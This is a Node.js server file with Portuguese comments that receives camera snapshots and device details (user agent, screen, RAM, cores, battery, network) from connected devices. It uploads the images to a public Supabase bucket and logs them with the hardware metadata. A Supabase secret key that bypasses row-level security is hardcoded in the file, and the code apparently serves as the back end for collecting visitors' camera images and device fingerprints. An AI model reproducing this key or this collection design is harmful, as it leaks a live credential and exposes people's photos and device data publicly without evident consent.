const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

// 🔐 CREDENCIAIS DO TEU SUPABASE MAPEADAS
const SUPABASE_URL = 'https://kunhccixuvswfzapenld.supabase.co';
const SUPABASE_KEY = 'sb_secret_s18pcBqSmiQshqiRGgY4mA_xJel4x8f'; // Secret key para escrita bypass-RLS no backend

// Inicializa o cliente Supabase
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e7 // Configurado para 10MB para suportar uploads de imagens em alta resolução
});

const PORT = 3000;

// Cache em memória para correlacionar os dados do hardware do socket específico ao tirar a foto
const cacheDispositivos = new Map();

// Serve o teu HTML principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    console.log(`\n[LIGAÇÃO] Novo dispositivo conectado: ${socket.id}`);

    // 1. Recebe metadados do hardware no handshake inicial
    socket.on('device:handshake', (data) => {
        cacheDispositivos.set(socket.id, data);
        console.log(`[HANDSHAKE] Hardware registado para o dispositivo ${socket.id}`);
    });

    // 2. Processa o disparo da câmara, envia para o Storage e insere na BD
    socket.on('camera:capture', async (payload) => {
        console.log(`[CAPTURA] Imagem recebida de ${socket.id}. A sincronizar com o Supabase remoto...`);
        
        // Recupera o hardware guardado na cache correspondente a este socket
        const hardware = cacheDispositivos.get(socket.id) || {};

        try {
            // Converte a string Base64 da imagem num Buffer binário
            const base64Data = payload.image.replace(/^data:image\/png;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');
            
            // Define um nome único para o ficheiro PNG utilizando timestamp
            const nomeFicheiro = `captura_${Date.now()}.png`;

            // A. Upload para o Supabase Storage (Bucket público: 'capturas')
            const { data: storageData, error: storageError } = await supabase
                .storage
                .from('capturas')
                .upload(nomeFicheiro, imageBuffer, {
                    contentType: 'image/png',
                    upsert: true
                });

            if (storageError) throw storageError;

            // Resolve o URL público definitivo da imagem armazenada no bucket
            const { data: { publicUrl } } = supabase
                .storage
                .from('capturas')
                .getPublicUrl(nomeFicheiro);

            console.log(`[STORAGE] Ficheiro guardado com sucesso: ${publicUrl}`);

            // B. Insere o registo completo na tabela 'registros_camera'
            const { error: dbError } = await supabase
                .from('registros_camera')
                .insert([{
                    url_imagem: publicUrl,
                    modo_camera: payload.cameraMode,
                    user_agent: hardware.userAgent || 'Desconhecido',
                    resolucao: hardware.screenResolution || 'Desconhecida',
                    idioma: hardware.language || 'Desconhecido',
                    nucleos: String(hardware.cores),
                    ram: String(hardware.ramAproximada),
                    tipo_rede: hardware.connectionType || 'Desconhecido',
                    bateria: hardware.batteryLevel || 'N/D'
                }]);

            if (dbError) throw dbError;

            console.log(`[BD SUPABASE] Registo de hardware e metadados gravado com sucesso!`);

        } catch (error) {
            console.error(`[ERRO CRÍTICO SUPABASE]:`, error.message || error);
        }
    });

    // Resposta imediata para sincronização do cálculo de Ping (Latência)
    socket.on('ping:latency', (callback) => {
        if (typeof callback === 'function') callback();
    });

    // Limpa a cache de hardware assim que o dispositivo perde a ligação websocket
    socket.on('disconnect', () => {
        cacheDispositivos.delete(socket.id);
        console.log(`[DESCONECTADO] Dispositivo removido da cache: ${socket.id}`);
    });
});

server.listen(PORT, () => {
    console.log(`\n=============================================================`);
    console.log(` Servidor Remoto Conectado ao Projeto Supabase Ativo `);
    console.log(` Endereço Local: http://localhost:${PORT}`);
    console.log(`=============================================================\n`);
});
